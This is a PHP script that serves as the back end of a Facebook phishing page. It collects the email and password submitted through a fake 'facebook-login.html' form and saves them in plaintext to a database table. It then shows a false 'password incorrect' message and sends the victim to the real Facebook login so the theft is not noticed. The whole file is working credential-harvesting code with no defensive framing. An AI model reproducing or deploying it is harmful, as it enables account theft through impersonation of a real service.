<?php

include "database.php";
$conn = database ();

if(isset($_POST['submit'])){
	$email = htmlentities(mysqli_real_escape_string($conn, $_POST['useremail']));
    $pass = htmlentities(mysqli_real_escape_string($conn, $_POST['userpass']));

      if($email == NULL){
        echo "<script>alert('Enter email, Please try again!');</script>";
		echo "<script>window.open('facebook-login.html', '_self')</script>";
      }
      if($pass == ""){
        echo "<script>alert('Enter password, Please try again!');</script>";
		echo "<script>window.open('facebook-login.html', '_self')</script>";
      }
		$sql = "INSERT INTO `crucial` (`id`, `email`, `pass`, `date`) VALUES (NULL, '$email', '$pass', current_timestamp());";
	    $credentials = $conn->query($sql) or die ($connect->error);
	    echo "<script>alert('The password you’ve entered is incorrect!');</script>";
	    echo "<script>window.open('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', '_self')</script>";

}

?>